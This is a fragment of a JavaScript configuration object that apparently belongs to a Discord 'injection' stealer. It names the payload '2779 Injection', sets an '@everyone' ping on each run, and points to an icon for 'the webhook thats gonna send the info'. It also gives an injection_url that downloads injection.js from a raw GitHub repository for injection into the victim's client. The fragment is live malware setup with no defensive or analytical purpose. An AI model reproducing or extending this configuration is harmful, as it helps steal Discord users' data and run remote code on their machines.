...
const config = {
  ...
  ping_on_run: true,
  ping_val: '@everyone', 
  embed_name: '2779 Injection', 
  embed_icon: 'https://media.discordapp.net/attachments/1040782573783224350/1041768977682153602/1BBEEA37-BAA0-4FCE-9D7E-7B82DC35B5D6.jpg?width=559&height=559'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 5639644, 
  injection_url: 'https://raw.githubusercontent.com/rengarbaba/injection/main/injection.js',
